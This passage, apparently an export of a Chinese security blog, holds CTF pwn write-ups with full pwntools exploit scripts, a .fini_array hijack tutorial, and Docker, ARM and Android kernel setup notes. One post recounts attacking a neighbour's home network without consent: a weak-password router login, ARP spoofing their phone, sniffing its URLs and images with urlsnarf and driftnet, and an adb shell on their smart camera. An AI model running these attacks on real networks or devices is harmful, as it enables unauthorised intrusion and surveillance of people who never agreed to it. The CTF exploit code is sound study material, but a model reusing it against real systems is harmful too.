fake_link_map += fake_Elf64_Dyn_SYM #0x10 fake_link_map += fake_Elf64_Dyn_JMPREL #0x10 fake_link_map += fake_Elf64_rela #0x18 fake_link_map += '\x00'*0x28 fake_link_map += p64(fake_Elf64_Dyn_STR_addr) #link_map_addr + 0x68 fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) #link_map_addr + 0x70 fake_link_map += '/bin/sh\x00'.ljust(0x80,'\x00') fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr) return fake_link_mapfake_link_map = fake_link_map_gen(link_map_addr,l_addr,elf.got['__libc_start_main']) payload = 'a'*0x80payload += p64(rbp)payload += p64(universal_gadget1)payload += p64(0) #pop rbxpayload += p64(1) #pop rbppayload += p64(elf.got['read']) #pop r12payload += p64(len(fake_link_map)+0x18) #pop r13payload += p64(write_addr) #pop r14payload += p64(0) #pop r15payload += p64(universal_gadget2) #retpayload += p64(0)*7payload += p64(main) p.sendafter('Input:\n',payload.ljust(0x200,'\x00'))sleep(1) fake_info = p64(0x4004A6) #jmpfake_info += p64(link_map_addr)fake_info += p64(0)fake_info += fake_link_mapp.send(fake_info) payload = 'a'*0x80+p64(rbp)+p64(pop_rdi_ret)+p64(link_map_addr+0x78)+p64(leave)#stack pivot,进入函数重定向p.sendafter('Input:\n',payload) p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[skysider/pwndocker 正确使用姿势]]></title>
    <url>%2F2020%2F02%2F24%2Fskysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[前言现在pwn题是越来越高版本的libc，一场比赛ubuntu16.04，ubuntu18.04切来切去的十分难受。一种可行的方案就是，装个16.04的虚拟机，然后在此之上装个18.04的docker，而且这个docker已经集成pwn常用工具以及各个版本libc。具体参考 https://github.com/skysider/pwndocker 18.04 pwndocker 安装docker hub 可以直接pull1docker pull skysider/pwndocker 但是pull的太慢了，我已经把他传到了阿里云上,用下面这条命令即可 1docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 pull完之后重命名一下 1docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker 使用姿势建议用官方的使用姿势，用如下命令run起来 12345678docker run -d \ --rm \ -h $&#123;ctf_name&#125; \ --name $&#123;ctf_name&#125; \ -v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \ -p 23946:23946 \ --cap-add=SYS_PTRACE \ skysider/pwndocker 其中有两个重要的参数-v $(pwd)/${ctf_name}:/ctf/work 是将当前目录下的文件映射到 docker /ctf/work目录下这样你在物理机修改文件，docker里面也会发生变化，就不用再docker cp了 –cap-add=SYS_PTRACE 这个参数也是要一定加的，不然docker里面没法用gdb调试。 可以把上述命令放到 pwndocker_run.sh里面 方便下次使用 然后调试脚本时，要先进去tmux ，python脚本里面指定终端为 tmux1context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;] 就可以 gdb.attach(p)了 如下图]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 i春秋公益赛pwn writeup]]></title>
    <url>%2F2020%2F02%2F22%2F2020-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9Bpwn-writeup%2F</url>
    <content type="text"><![CDATA[force标准的house of force，先申请较大的内存页，可泄露出libc基址，然后申请较小堆块，溢出修改top chunk的size为0xffffffffffffffff,申请堆块到__malloc_hook附近，这里用onegadget，不满足条件，可修改为system函数，然后申请”/bin/sh”所在地址的堆块，即可getshell exp12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context.log_level = &apos;debug&apos;offset = 0x4ff010#0x4aa010#0x4ec010#while True: warn(hex(offset)) try: p = process(&apos;./pwn&apos;) #p = remote(&apos;123.56.85.29&apos;,7147) def add(size,content): p.sendlineafter(&apos;1:&apos;,&apos;1&apos;) p.sendlineafter(&apos;size&apos;,str(size)) p.recvuntil(&apos;addr &apos;) addr = int(p.recvuntil(&apos;\n&apos;,drop = True),16) p.sendafter(&apos;content&apos;,content) return addr chunk1 = add(0x100000,&apos;aaaa&apos;) info(hex(chunk1)) libc = chunk1 - offset info(hex(libc)) chunk2 = add(0x28,&apos;\xff&apos;*0x30)+0x20 info(hex(chunk2)) mallochook = libc+0x3c4b10 chunk3 = add(mallochook-chunk2-0x20,&apos;bbbb&apos;) chunk4 = add(0x20,p64(libc+0x45390)*4) #gdb.attach(p) #pause() p.sendlineafter(&apos;1:&apos;,&apos;1&apos;) p.sendafter(&apos;size&apos;,str(libc+0x18cd57)) print(p.recv()) p.interactive() except Exception as e: offset-=0x1000 p.close() pass BorrowStack栈溢出0x10字节，栈迁移到bss段后，构造rop链。需要注意的是，要尽量迁移到距离bss段更远的地址，为了防止bss段上面的got表被修改。因为在调用函数时，栈由高地址向低地址生长，可能会修改到got表里面的内容。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *import syscontext.log_level = &apos;debug&apos;def pwn(): offest=152 #while (1): try: if sys.argv[1]==&quot;l&quot;: p=process(&apos;./pwn&apos;) libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) else: p=remote(&apos;123.56.85.29&apos;,3635) libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) elf=ELF(&apos;./pwn&apos;) bss_addr=0x601080 p.recvuntil(&apos;\n&apos;) #gdb.attach(p, &quot;b *0x400680&quot;) payload=&apos;a&apos;*0x60+p64(bss_addr+offest)+p64(0x400699) p.send(payload) p.recvuntil(&apos;\n&apos;) payload = &apos;b&apos;*offest+p64(bss_addr+offest)+p64(0x400703)+p64(elf.got[&quot;read&quot;])+p64(elf.sym[&quot;puts&quot;])+p64(0x400626) p.send(payload) leak=u64(p.recv(6).ljust(8,&apos;\x00&apos;)) libc_addr=leak-libc.sym[&quot;read&quot;] p.recvuntil(&apos;Tell me what you want\n&apos;) payload=&apos;a&apos;*0x60+p64(0)+p64(libc_addr+0x4526a) p.send(payload) p.recvuntil(&apos;\n&apos;) payload=&apos;b&apos;*0x10 p.send(payload) print offest pause() p.interactive() #p.close() except: offest=offest+1pwn() Some_thing_excetingflag已经被写到bss段内，用double free漏洞申请堆块到bss段，然后输出堆块内容即可。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *import syscontext.log_level = &apos;debug&apos;if sys.argv[1]==&quot;l&quot;: p=process(&apos;./excited&apos;) libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)else: p=remote(&apos;123.56.85.29&apos;,6484) libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)e=ELF(&apos;./excited&apos;)def show(index): p.recvuntil(&apos;to do :&apos;) p.sendline(&apos;4&apos;) p.recvuntil(&apos;: &apos;) p.sendline(str(index))def new(lenght,cont,lenght2,cont2): p.recvuntil(&apos;to do :&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;: &apos;) p.sendline(str(lenght)) p.recvuntil(&apos;: &apos;) p.sendline(cont) p.recvuntil(&apos;: &apos;) p.sendline(str(lenght2)) p.recvuntil(&apos;: &apos;) p.sendline(cont2)def delete(num): p.recvuntil(&apos;to do :&apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;: &apos;) p.sendline(str(num))new(0x60,&apos;a&apos;*0x8,0x50,&apos;\x10&apos;*0x8)new(0x60,&apos;b&apos;*0x8,0x50,&apos;\x11&apos;*0x8)new(0x60,&apos;c&apos;*0x8,0x50,&apos;\x12&apos;*0x8)delete(0)delete(1)delete(0)bss_addr=0x6020A8new(0x50,p64(bss_addr-0x10),0x50,&apos;\x14&apos;*4)new(0x50,&apos;\x16&apos;*4,0x50,&apos;\x17&apos;*1)show(1)print p.recv()p.interactive() Some_thing_interesting格式化字符漏洞泄露libc基址，然后double free修改malloc_hook为onegadget exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *import syscontext.log_level = &apos;debug&apos;if sys.argv[1]==&quot;l&quot;: p=process(&apos;./interested&apos;) libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)else: p=remote(&apos;123.56.85.29&apos;,3041) libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)e=ELF(&apos;./interested&apos;)def show(index): p.recvuntil(&apos;to do :&apos;) p.sendline(&apos;4&apos;) p.recvuntil(&apos;: &apos;) p.sendline(str(index))def new(lenght,cont,lenght2,cont2): p.recvuntil(&apos;to do :&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;: &apos;) p.sendline(str(lenght)) p.recvuntil(&apos;: &apos;) p.sendline(cont) p.recvuntil(&apos;: &apos;) p.sendline(str(lenght2)) p.recvuntil(&apos;: &apos;) p.sendline(cont2)def edit(index,cont,cont2): p.recvuntil(&apos;to do :&apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;: &apos;) p.sendline(str(index)) p.recvuntil(&apos;: &apos;) p.sendline(cont) p.recvuntil(&apos;: &apos;) p.sendline(cont2)def check(): p.recvuntil(&apos;to do :&apos;) p.sendline(&apos;0&apos;) #info(p.recv(49)) #leak=int(p.recv(12),16) p.recvline() leak=int(p.recvline()[31:43],16) print hex(leak) pause() return leakdef delete(num): p.recvuntil(&apos;to do :&apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;: &apos;) p.sendline(str(num))p.recvuntil(&quot;:&quot;)p.send(&apos;OreOOrereOOreO%17$p&apos;)libc_addr=check()-0x20830new(0x40,&apos;a&apos;*0x8,0x60,&apos;\x10&apos;*0x8) #1new(0x40,&apos;b&apos;*0x8,0x60,&apos;\x11&apos;*0x8) #2new(0x40,&apos;c&apos;*0x8,0x60,&apos;\x12&apos;*0x8) #3delete(1)delete(2)delete(1)new(0x60,p64(libc_addr+libc.sym[&quot;__malloc_hook&quot;]-0x23),0x60,&apos;\x14&apos;*4)new(0x60,&apos;\x16&apos;*4,0x60,&apos;\x1f&apos;*0x13+p64(libc_addr+0xf1147))#gdb.attach(p)pause()p.recvuntil(&apos;to do :&apos;)p.sendline(&apos;1&apos;)p.recvuntil(&apos;: &apos;)p.sendline(str(0x60))p.interactive() BFnote一个栈溢出，然后在bss上写值，申请任意大小的chunk，以chunk为基址进行任意偏移写 栈溢出被canary拦住了，预期解是通过申请很大的chunk，会mmap到libc附近地址，接着通过偏移改写TLS中的canary，接着就是常规ROP的操作了，可以ret2dlresolve，也可以爆破1/4096直接改写got表为system，调用即可。还看到了另一位师傅的wp，使用mprotect改bss可执行，写入shellcode就行了]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[.fini_array段劫持]]></title>
    <url>%2F2020%2F02%2F20%2F%C2%96-fini-array%E6%AE%B5%E5%8A%AB%E6%8C%81%2F</url>
    <content type="text"><![CDATA[参考链接: https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/ 前言大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。 .init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写.fini_array 函数指针。对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。 Demo 11234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static void start(void) __attribute__ ((constructor));static void stop(void) __attribute__ ((destructor));int main(int argc, char *argv[])&#123; printf("start == %p\n", start); printf("stop == %p\n", stop); return 0;&#125;void start(void)&#123; printf("hello world!\n");&#125;void stop(void)&#123; printf("goodbye world!\n");&#125; gcc为函数提供了几种类型的属性，其中两个是我们特别感兴趣的：构造函数(constructors)和析构函数(destructors)。程序员应当使用类似下面的方式来指定这些属性： 12static void start(void) __attribute__ ((constructor));static void stop(void) __attribute__ ((destructor)); 带有”构造函数”属性的函数将在main()函数之前被执行，而声明为”析构函数”属性的函数则将在after main()退出时执行。 程序运行结果如下：12345678➜ fini_array gcc test.c -o test➜ fini_array lstest test.c➜ fini_array ./testhello world!start == 0x4005a4stop == 0x4005b5goodbye world! 下载我们试试 objdump -h ./test 12345➜ fini_array objdump -h ./test18 .init_array 00000010 0000000000600e00 0000000000600e00 00000e00 2**3 CONTENTS, ALLOC, LOAD, DATA19 .fini_array 00000010 0000000000600e10 0000000000600e10 00000e10 2**3 CONTENTS, ALLOC, LOAD, DATA 可以看到.init_array的地址为 0x600e00 , .fini_array的地址为 0x600e10 在gdb中分别对这两个地址跟踪一下 123pwndbg&gt; x/4xg 0x600e000x600e00: 0x0000000000400540 0x00000000004005a40x600e10: 0x0000000000400520 0x00000000004005b5 分析一下结果.init_array存的 0x400540是 frame_dummy函数地址(ida里面可查看) 0x4005a4很明显是自己定义的start函数的地址 .fini_array存的 0x400540是 __do_global_dtors_aux函数地址(ida里面可查看) 0x4005b5 很明显是定义的stop函数的地址 Demo 2我们再看一个例子,其实就是前面的test程序函数少了属性，我把它定义成静态函数： 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static void start(void);static void stop(void);int main(int argc, char *argv[])&#123; printf("start == %p\n", start); printf("stop == %p\n", stop); return 0;&#125;void start(void)&#123; printf("hello world!\n");&#125;void stop(void)&#123; printf("goodbye world!\n");&#125; 同样编译和运行： 1234➜ fini_array gcc test2.c -o test➜ fini_array ./teststart == 0x4005a4stop == 0x4005b5 函数地址并没有变化，但是因为start/stop函数未设定析构与构造属性，所以没有在开始和结束时被调用。 我们试试 objdump -h ./test2 12345➜ fini_array objdump -h ./test218 .init_array 00000008 0000000000600e10 0000000000600e10 00000e10 2**3 CONTENTS, ALLOC, LOAD, DATA19 .fini_array 00000008 0000000000600e18 0000000000600e18 00000e18 2**3 CONTENTS, ALLOC, LOAD, DATA 可以看到.init_array的地址为 0x600e10 , .fini_array的地址为 0x600e18，和test程序有点偏差。 现在我用gdb跟踪一波，查看一下.fini_array 12pwndbg&gt; x/2xg 0x600e180x600e18: 0x0000000000400530 0x0000000000000000 明显0x0000000000400530后面的函数指针没有被填充 是0x0000000000000000，所以程序结束后不会执行stop函数 现在我们控制程序执行流程，怎么控制呢？我把.fini_array的函数指针0x0000000000400530覆盖成stop函数的地址 123pwndbg&gt; set &#123;int&#125;0x600e18=0x4005b5pwndbg&gt; x/2xg 0x600e18 0x600e18: 0x00000000004005b5 0x0000000000000000 输入c继续执行程序 123456pwndbg&gt; cContinuing.start == 0x4005a4stop == 0x4005b5goodbye world![Inferior 1 (process 7442) exited normally] 成功执行了stop函数，如果stop函数是一段onegadget或shellcode我们就可以直接拿下shell 分析与总结我们来关心一下，上面的stop在什么地方被调用。 栈回溯跟踪看一下 123456789101112131415161718192021222324252627282930 ► 0x4005b5 &lt;stop&gt; push rbp 0x4005b6 &lt;stop+1&gt; mov rbp, rsp 0x4005b9 &lt;stop+4&gt; mov edi, 0x40067a 0x4005be &lt;stop+9&gt; call puts@plt &lt;0x400430&gt; 0x4005c3 &lt;stop+14&gt; nop 0x4005c4 &lt;stop+15&gt; pop rbp 0x4005c5 &lt;stop+16&gt; ret 0x4005c6 nop word ptr cs:[rax + rax] 0x4005d0 &lt;__libc_csu_init&gt; push r15 0x4005d2 &lt;__libc_csu_init+2&gt; push r14 0x4005d4 &lt;__libc_csu_init+4&gt; mov r15d, edi───────────────────────────────────────[ STACK ]───────────────────────────────────────00:0000│ rsp 0x7fffffffdc68 —▸ 0x7ffff7de7df7 (_dl_fini+823) ◂— test r13d, r13d01:0008│ r14 0x7fffffffdc70 —▸ 0x7ffff7ffe168 ◂— 0x002:0010│ 0x7fffffffdc78 —▸ 0x7ffff7ffe700 —▸ 0x7ffff7ffa000 ◂— jg 0x7ffff7ffa04703:0018│ 0x7fffffffdc80 —▸ 0x7ffff7fb5000 —▸ 0x7ffff7a0d000 ◂— jg 0x7ffff7a0d04704:0020│ r10 0x7fffffffdc88 —▸ 0x7ffff7ffd9d8 (_rtld_global+2456) —▸ 0x7ffff7dd7000 ◂— jg 0x7ffff7dd704705:0028│ 0x7fffffffdc90 —▸ 0x7fffffffdd60 —▸ 0x7fffffffde50 ◂— 0x106:0030│ 0x7fffffffdc98 —▸ 0x7ffff7de7b44 (_dl_fini+132) ◂— mov ecx, dword ptr [r12]07:0038│ 0x7fffffffdca0 —▸ 0x7fffffffdc70 —▸ 0x7ffff7ffe168 ◂— 0x0─────────────────────────────────────[ BACKTRACE ]───────────────────────────────────── ► f 0 4005b5 stop f 1 7ffff7de7df7 _dl_fini+823 f 2 7ffff7a46ff8 __run_exit_handlers+232 f 3 7ffff7a47045 f 4 7ffff7a2d837 __libc_start_main+247Breakpoint *0x4005b5Breakpoint *0x4005B5 看到返回地址在_dl_fini+823，所以可以得出结论，.fini_array区节的第一个函数指针在程序结束时，由_dl_fini函数调用，所以我们可加以利用。在未开启PIE的情况下，只需实现一个任意地址写，将.fini_array区节的第一个函数指针改写成后门地址或者one_gadgets，在程序结束时便能控制流程]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次家庭局域网渗透经历]]></title>
    <url>%2F2020%2F02%2F03%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86%2F</url>
    <content type="text"><![CDATA[前言寒假有些无聊,就连上隔壁家wifi玩了玩。抱着试一试的态度，却发现很多好玩的东西。 登录路由器后台访问 192.168.1.1 直接连上了，竟然没有做一些限制，然后直接弱口令登陆进去了。看来隔壁家安全意识不高啊。 进去后台大致浏览了一遍，发现了连接的客户端，也没有静态ARP绑定设置，这样就可以玩ARP欺骗了。 ARP欺骗祭出尘封已久的kail,首先要把kail设为桥接模式，确保与物理机在同一网段。 然后 echo 1 &gt; /proc/sys/net/ipv4/ip_forward 进行ip转发，保证客户端的正常上网 这里用arpspoof工具来嗅探ip为192.168.1.145的荣耀V20arpspoof -i eth0 -t 192.168.1.145 -r 192.168.1.1执行上述命令后，arpspoofing将向路由器发送伪造请求。 此请求将路由器默认IP地址链接到kali linux mac地址 获得目标设备的SNIFF网站打开另一个终端并输入urlsnarf -i eth0Urlsnarf显示目标正在访问的所有网站，-i用于输入网络接口名称。 可以看到目标正在玩QQ 获得目标设备的SNIFF图像打开另一个终端并输入driftnet -i eth0Driftnet显示了目标在互联网上访问的图像，如下所示。 -i用于输入网络接口名称。一个新窗口将在kali linux中打开，并将嗅探目标正在访问的所有图像，嗅探到了大力的图片! 入侵智能摄像头局域网内有一个未知的设备，用nmap扫了一下，发现开了554和5555端口；上网搜了一下，这两个端口都能搞事，应该是一个智能摄像头。社工了一波可能是小米家的小方摄像头。554端口下的rtsp服务是实时流传输协议，是用来传输视频的5555端口是用来远程调试的 554端口 需要去插SD卡，不太好还是算了吧。我还是用VCL看流媒体吧,推荐几个可以测试的流媒体 湖南卫视 rtmp://58.200.131.2:1935/livetv/hunantvCCTV1高清 http://ivi.bupt.edu.cn/hls/cctv1hd.m3u8 5555端口用adb远程连一下，可以连上./adb connect 192.168.1.102:5555./adb shell 开启shell，竟然直接进去了。 查看一下开启的端口，加载的驱动 接下来就是通过驱动来内核提权了，待我再研究一番来补上续集。 参考文章：使用MITM监控流量（中间人攻击）http://www.kb-iot.com/post/706.htmlWi-Fi 安全攻略https://www.secpulse.com/archives/5455.htmlAndroid-TV-adb-5555端口攻击说明https://wenku.baidu.com/view/ba39d1bef021dd36a32d7375a417866fb84ac04f.html常见网络摄像机的端口及RTSP地址https://www.jiangyu.org/port-and-rtsp-address-of-several-ipcams/破解小方摄像头https://www.jianshu.com/p/7b56d3ae72f4routerpwnhttp://routerpwn.com/]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[arm pwn 环境搭建]]></title>
    <url>%2F2020%2F01%2F21%2Farm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[arm pwn 环境搭建qemu 简介qemu是一款可执行硬件虚拟化的虚拟机，与他类似的还有Bochs、PearPC，但qemu具有高速（配合KVM）、跨平台的特性qemu主要有两种运行模式：qemu-user 和 qemu-system安装 qemu-user1$sudo apt-get install qemu qemu-user qemu-user-static 此时可以运行静态链接的arm程序，而要运行动态链接的程序，需要安装对应架构的动态链接库：1$ apt search &quot;libc6-&quot; | grep &quot;arm&quot; 安装 qemu-system1$ sudo apt-get install qemu qemu-user-static qemu-system uml-utilities bridge-utils Ubuntu 16.04（deepin）安装 gdb、gdb-multiarch1$ sudo apt-get install gdb gdb-multiarch 安装 gdb plugin（peda、pwndbg、gef） peda_arm：https://github.com/alset0326/peda-armpwndbg：https://github.com/pwndbg/pwndbggef：https://github.com/hugsy/gef 配置qemu-system网络qemu-system模式配置网络常见的方法是tap桥接安装网络配置的依赖文件：$ sudo apt install uml-utilities bridge-utils 修改Ubuntu主机网络接口配置文件：$sudo vim /etc/network/interfaces 12345678# interfaces(5) file used by ifup(8) and ifdown(8)auto loiface lo inet loopbackauto ens33iface ens33 inet dhcpiface br0 inet dhcp bridge_ports ens33 bridge_maxwait 0 创建并编写qemu网络接口启动脚本：$ sudo vim /etc/qemu-ifup12345678910#!/bin/shsudo qemu-system-arm \-M vexpress-a9 \-kernel vmlinuz-3.2.0-4-vexpress \-initrd initrd.img-3.2.0-4-vexpress \-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \-append "root=/dev/mmcblk0p2 console=ttyAMA0" \-net nic,macaddr=52:54:00:12:34:56 \-net tap \-nographic 保存文件后使用如下命令修改qemu-ifup的权限：$ sudo chmod a+x /etc/qemu-ifup 重启网络使配置生效：$ sudo /etc/init.d/networking restart 启动桥接网络：$ sudo ifdown ens33 &amp;&amp; sudo ifup br0运行之后，桥br0代替ens33接管了ubuntu虚拟机的网口： 下载qemu的镜像和磁盘：https://people.debian.org/~aurel32/qemu/armhf/ 启动 qemu./start.sh12345678910#!/bin/shsudo qemu-system-arm \-M vexpress-a9 \-kernel vmlinuz-3.2.0-4-vexpress \-initrd initrd.img-3.2.0-4-vexpress \-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \-net nic,macaddr=52:54:00:12:34:56 \-net tap \-nographic 也可以使用docker运行一个qemu arm容器,比较方便https://island123.github.io/2020/01/15/Docker%E8%BF%90%E8%A1%8Cqemu%20arm%E5%AE%B9%E5%99%A8%20/#%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8Cqemu-arm%E5%AE%B9%E5%99%A8 https://github.com/fireundubh/IDA7-Rizzo ida7.0，把rizzo.py放到ida插件文件夹里 参考文章：http://myhackerworld.top/2018/09/27/arm-pwn/]]></content>
      <categories>
        <category>arm-pwn</category>
      </categories>
      <tags>
        <tag>arm-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 xman writeup]]></title>
    <url>%2F2020%2F01%2F20%2F2019-xman-writeup%2F</url>
    <content type="text"><![CDATA[format32位格式化字符串漏洞,只开了NX保护,有多次漏洞利用机会，并且有system(“/bin/sh”),题目难点在于是堆上的格式化字符串漏洞，不能用常规的任意地址写手法 解题思路：寻找如下图合适的跳板，第一次修改跳板为函数返回地址所在的栈地址，第二次修改函数返回地址为后门的地址。 exp成功几率16分之一 1234567891011121314151617181920212223#!/usr/bin/python2.7# -*- coding: utf-8 -*-from pwn import * context.log_level='debug' for y in xrange(5000): #with remote("node3.buuoj.cn",26370) as p: with process("./chall") as p: p.recvuntil("...\n") p.recvuntil("...\n") gdb.attach(p,"b *0x080485F6") p.sendline("%60c%10$hhn|%34219c%18$hnBBB") #pause() try: p.recvuntil("BBB") #p.interactive() p.sendline("ls") data = p.recvuntil("flag") print(data) if("flag" in data): p.interactive() except Exception as e: print('exception %s' % e) p.close() nocall64位程序，保护全开。题目提示输入shellcode,但这个题使用了seccomp机制，限制了execve系统调用。 解题思路因为flag的地址已经暴露了，程序也开启了5秒的计时器，可以通过基于时间的方法爆破flag。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/python2.7# -*- coding: utf-8 -*-from pwn import *from time import timefrom string import printable#context.log_level = "debug"context.arch = "amd64"flag=''s = '&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz'for i in range(0x2000000000,0x200000000+0x30): for j in s: payload=asm( """ mov al,[&#123;&#125;] mov bl,&#123;&#125; loop: cmp al,bl jz loop ret """.format(str(hex(i)),str(hex(ord(j))))) try: #p = remote("node3.buuoj.cn",29793) p = process("./chall") p.recvuntil("Your Shellcode &gt;&gt;") time1=time() print str(hex(i))+"-----"+j p.sendline(payload) p.can_recv(2) time2=time() p.close() #pause() if time2-time1&gt;1: flag+=j print flag break else: pass except: passprint flag shellmaster1A=$&#123;PATH##*:&#125;;B=$&#123;A%???&#125;;$PWD$B????]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android kernel 入门]]></title>
    <url>%2F2020%2F01%2F12%2FAndroid%20kernel%20%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[基础知识Android 系统架构Android系统构架是安卓系统的体系结构，android的系统架构和其操作系统一样，采用了分层的架构，一般共分为四层，从高到低分别是： Android应用层 - 包括通话短信联系人这种系统级的应用，还包括用户自己安装的第三方应用 Android应用框架层 - 这一层大部分用Java写的，包括系统服务和四大组件 Android系统运行层 - 这一层大部分都是C/C++写的，主要是虚拟机 Dalvik/ART ，还有一些第三方库 Linux内核层 - 包含Linux内核和一些驱动，比如说蓝牙驱动，Camera驱动等等 还有 HAL层-硬件抽象层 Android系统构架主要应用于ARM平台，但不仅限于ARM，通过编译控制，在X86、MAC等体系结构的机器上同样可以运行。 Android进程间通信-binder IPC(Inter-Process Communication)进程间通讯 C（低权限应用）/S（高权限系统服务） /dev/binder – framework和app之间IPC通信桥梁 /dev/hwbinder（8.0之后） – framework和vendor之间的IPC通信桥梁 /dev/vndbinder（8.0之后） – vendor和vendor之间的IPC通信桥梁 SELinux限制Android 8.0之后推出厂商升级成本大大降低，8.0之后增加vendor.img镜像 ，攻击面大大减少， 很多厂商的代码不与应用层直接交互， 增加了应用和厂商代码的SELinux限制 Android 内核攻击面 应用直达内核路径寥寥无几 – /dev/binder、/dev/ashmem等 厂商自定义的驱动设备 – cat /proc/devices 应用 -&gt; system_server等 -&gt; 内核 应用 -&gt; 系统应用 -&gt; system_server等 -&gt; 内核 Android内核缓释机制 DAC/ CAP Linux最基本的安全缓释机制 PXN（Privileged Execute Never）类似于x86中的SMEP,防止内核态执行用户态代码,防御RET2USR攻击,可以通过修改rc4 来绕过。Android 5 arm64后开启，Android通过页表来开启PXN。 PAN (Privileged Access Never) 类似于x86中的SMAP ,防止内核任意读取用户态数据，Android 8.0之后加入。 SECCOMP 限制应用程序可以使用的系统调用，增加系统的安全性。shell中执行exp不会受到限制，apk中执行exp会受到seccomp限制，比如无法调到setuid、chroot、mount等。Android 8.0之后影响所有zygote孵化出来的进程。 KASLR 内核地址空间布局随机化，可以让kernel image映射的地址相对于链接地址有个偏移，利用需要泄露内核信息。Android kernel版本大于4.4之后默认开启。 AVB （Android Verified Boot 启动时验证）启动时验证boot、system、vendor等是否被篡改，Persistent root 克星。Android 7.0 之后严格执行启动验证，Android 8.0 之后默认集成AVB2.0 ，有回滚保护，防止回滚到有漏洞的版本。 Android 内核漏洞利用基础知识内核关键数据结构 线程数据结构体，内核栈和hread_info共用一片区域 ,其中 addr_limit 用户态 0x7ffffffff000 1234567891011121314union thread_union&#123; struct thread_info thread_info; unsigned long stack[THREAD_SIZE/sizeof(lone)];&#125;struct thread_info&#123; unsigned long flag; /*low level flag*/ mm_segment_t addr_limit; /*address limit */ struct task_struct *task; struct exec_domain *exec_domian; /* execution domain */ struct restart_block restart_block; int preempt_count; int cpu;&#125; 进程描述符 1234567891011121314151617struct task_ struct &#123; volatile long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */ void *stack; // contains addr_ limi t unsigned int flags; /* per process flags, defined below */ ... struct list_ head tasks ; struct mm struct *mm， *active_ mm; #ifdef CONFIG COMPAT_ BRK unsigned brk randomized:1; ... /* process credentials */ const struct cred __rcu *real_cred; /* objective and real subjective task */ consts truct cred __rcu *ered; /* effective (overridable) subjective task */ char comm[TASK_COMM_LEN] ; ... struct seccomp seccomp ;&#125; 安全凭证cred 123456789101112131415161718struct cred &#123; unsigned int usage; uid_t uid; gid_t gid; uid_t suid; gid_t sgid; uid_t euid; gid_t egid; uid_t fsuid; gid_t fsgid; unsigned int securebits; struct kernel_cap_struct cap_inheritable; struct kernel_cap_struct Cap_permitted; struct kernel_cap_struct cap_ef fective; struct 